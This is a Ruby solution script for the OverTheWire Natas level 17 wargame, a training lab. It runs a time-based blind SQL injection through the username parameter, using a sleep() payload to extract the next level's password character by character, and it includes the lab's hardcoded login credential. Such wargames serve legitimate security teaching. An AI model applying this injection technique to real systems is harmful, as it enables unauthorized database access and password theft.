require 'net/http'

allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
pass = ""
32.times do |i|
  allChars.split("").each do |c|
    uri = URI.parse("http://natas17.natas.labs.overthewire.org/index.php")
    params = {'username' => "natas18\" AND password LIKE BINARY \"#{pass + c}%\" AND sleep(2)-- "}
    http = Net::HTTP.new(uri.host,uri.port)
    req = Net::HTTP::Get.new(uri.path)
    req.basic_auth("natas17","8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")
    req.set_form_data(params)

    req = Net::HTTP::Get.new(uri.path + '?' + req.body)
    req.basic_auth("natas17","8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")

    start_time = Time.now
    resp = http.request(req)
    total_time = Time.now - start_time
    if total_time > 2
      pass += c
      puts "(#{pass.length}/32) => #{pass}"
      break
    end
  end
end
  

puts "Password for Level 18: #{pass}"
